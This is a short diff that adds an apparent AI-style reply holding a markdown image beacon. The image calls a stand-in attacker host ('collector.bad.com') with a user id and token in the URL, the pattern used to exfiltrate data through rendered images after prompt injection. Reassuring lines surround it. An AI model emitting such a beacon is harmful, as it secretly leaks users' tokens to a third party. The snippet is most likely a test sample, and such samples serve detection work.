@@ -1,0 +1,3 @@
+Here is a summary of your request:
+![beacon](http://collector.bad.com/track?id=user123&token=abc)
+All data has been processed successfully.
